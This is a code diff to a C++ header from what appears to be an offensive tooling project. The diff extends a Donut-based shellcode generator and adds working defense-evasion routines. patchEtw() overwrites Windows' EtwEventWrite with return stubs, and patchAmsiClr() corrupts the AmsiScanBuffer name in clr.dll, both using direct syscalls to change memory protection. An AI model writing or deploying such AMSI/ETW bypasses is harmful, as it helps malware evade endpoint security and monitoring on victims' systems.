@@ -17,6 +17,8 @@
     #include <io.h>
     #include <fcntl.h>
     // #include <altstr.h>
+
+    #include "syscall.hpp"
 #endif
 
 
@@ -24,11 +26,12 @@
 
 #include <donut.h>
 
+
 // create the shellcode from exe, unmanaged DLL/EXE or .NET DLL/EXE
 // method, name of method or DLL function to invoke for .NET DLL and unmanaged DLL
 // param, command line to use for unmanaged DLL/EXE and .NET DLL/EXE
 std::string static inline creatShellCodeDonut(
-    std::string cmd, std::string method, std::string param, std::string& shellcode, bool exitProcess=true, bool debug=false)
+    std::string cmd, std::string method, std::string param, std::string& shellcode, bool exitProcess=true, bool debug=false, std::string arch = "x64")
 {
     std::string result;
 
@@ -40,8 +43,18 @@ std::string static inline creatShellCodeDonut(
     memcpy(c.input, cmd.c_str(), DONUT_MAX_NAME - 1);
 
     // default settings
+
     c.inst_type = DONUT_INSTANCE_EMBED; // file is embedded
-    c.arch = DONUT_ARCH_X84;            // dual-mode (x86+amd64)
+
+    if(arch=="x64")
+        c.arch = DONUT_ARCH_X64;
+    else if(arch=="x86")
+        c.arch = DONUT_ARCH_X86;
+    else if(arch=="arm64")
+        c.arch = DONUT_ARCH_ARM64;
+    else
+        c.arch = DONUT_ARCH_X84;
+
     c.bypass = DONUT_BYPASS_CONTINUE;    // continues loading even if disabling AMSI/WLDP fails
     c.format = DONUT_FORMAT_BINARY;        // default output format
     c.compress = DONUT_COMPRESS_NONE;    // compression is disabled by default
@@ -264,6 +277,194 @@ int static inline launchProcess(const std::string& processToSpawn)
     CreateProcess(processToSpawn.c_str(), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 
     return pi.dwProcessId;
+}
+
+
+int static inline patchEtw()
+{
+    void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
+    
+    HANDLE hProc=(HANDLE)-1;
+    DWORD oldprotect = 0;
+    HANDLE hProcess = GetCurrentProcess();
+    SIZE_T dwSize = 1024;
+    Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, PAGE_READWRITE, &oldprotect);
+
+    #if defined(_M_ARM64) || defined(__aarch64__)
+        char patch[] = "\x00\x00\x80\x52\xc0\x03\x5f\xd6"; // mov w0, #0; ret
+        int patchSize = 8;
+    #elif defined(_WIN64)
+        char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
+        int patchSize = 4;
+    #else
+        char patch[] = "\x33\xc0\xc2\x14\x00"; // xor eax, eax; ret 14
+        int patchSize = 5;
+    #endif
+    
+    WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, nullptr);
+
+    Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, oldprotect, &oldprotect);
+
+    return 0;
+}
+
+
+static bool GetModuleRange(HMODULE moduleBase, BYTE** moduleStart, SIZE_T* moduleSize)
+{
+    if (!moduleBase || !moduleStart || !moduleSize)
+        return false;
+
+    BYTE* base = reinterpret_cast<BYTE*>(moduleBase);
+
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+        return false;
+
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE)
+        return false;
+
+    *moduleStart = base;
+    *moduleSize = nt->OptionalHeader.SizeOfImage;
+
+    return true;
+}
+
+
+static BYTE* FindBytes(BYTE* start, SIZE_T size, const std::vector<BYTE>& pattern)
+{
+    if (!start || size == 0 || pattern.empty() || pattern.size() > size)
+        return nullptr;
+
+    BYTE* end = start + size - pattern.size();
+
+    for (BYTE* p = start; p <= end; p++)
+    {
+        if (memcmp(p, pattern.data(), pattern.size()) == 0)
+            return p;
+    }
+
+    return nullptr;
+}
+
+
+static bool IsReadablePage(DWORD protect)
+{
+    if (protect & PAGE_GUARD)
+        return false;
+
+    if (protect & PAGE_NOACCESS)
+        return false;
+
+    DWORD baseProtect = protect & 0xff;
+
+    switch (baseProtect)
+    {
+    case PAGE_READONLY:
+    case PAGE_READWRITE:
+    case PAGE_WRITECOPY:
+    case PAGE_EXECUTE_READ:
+    case PAGE_EXECUTE_READWRITE:
+    case PAGE_EXECUTE_WRITECOPY:
+        return true;
+
+    default:
+        return false;
+    }
+}
+
+
+static BYTE* FindBytesInReadableMemory(
+    BYTE* start,
+    SIZE_T size,
+    const std::vector<BYTE>& pattern
+)
+{
+    if (!start || size == 0 || pattern.empty())
+        return nullptr;
+
+    BYTE* moduleEnd = start + size;
+    BYTE* current = start;
+
+    while (current < moduleEnd)
+    {
+        MEMORY_BASIC_INFORMATION mbi{};
+
+        if (!VirtualQuery(current, &mbi, sizeof(mbi)))
+            break;
+
+        BYTE* regionBase = reinterpret_cast<BYTE*>(mbi.BaseAddress);
+        BYTE* regionEnd  = regionBase + mbi.RegionSize;
+
+        if (regionEnd > moduleEnd)
+            regionEnd = moduleEnd;
+
+        BYTE* scanStart = current;
+
+        if (scanStart < regionBase)
+            scanStart = regionBase;
+
+        if (
+            mbi.State == MEM_COMMIT &&
+            IsReadablePage(mbi.Protect) &&
+            scanStart < regionEnd
+        )
+        {
+            SIZE_T scanSize = static_cast<SIZE_T>(regionEnd - scanStart);
+
+            BYTE* found = FindBytes(scanStart, scanSize, pattern);
+
+            if (found)
+                return found;
+        }
+
+        current = regionEnd;
+    }
+
+    return nullptr;
+}
+
+int static inline patchAmsiClr()
+{
+    HMODULE module = LoadLibrary("clr.dll");
+
+    BYTE* moduleStart = nullptr;
+    SIZE_T moduleSize = 0;
+
+    if (!GetModuleRange(module, &moduleStart, &moduleSize))
+        return -1;
+
+    // AmsiScanBuffer
+    std::vector<BYTE> oldBytes = { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
+
+    void* found = FindBytesInReadableMemory(
+        moduleStart,
+        moduleSize,
+        oldBytes
+    );
+
+    if (!found)
+        return -1;
+
+    
+    char NewBytes[] = "AAAAAAAAAAAAAA";
+
+    DWORD oldprotect = 0;
+    HANDLE hProcess = GetCurrentProcess();
+    SIZE_T dwSize = 1024;
+    Sw3NtProtectVirtualMemory_(hProcess, &found, &dwSize, PAGE_READWRITE, &oldprotect);
+    
+    WriteProcessMemory(hProcess, found, (PVOID)NewBytes, 14, nullptr);
+
+    Sw3NtProtectVirtualMemory_(hProcess, &found, &dwSize, oldprotect, &oldprotect);
+
+    return 0;
+}
+
+// TODO
+int static inline patchAmsiPowershell()
+{
+    return -1;
 }
 
 
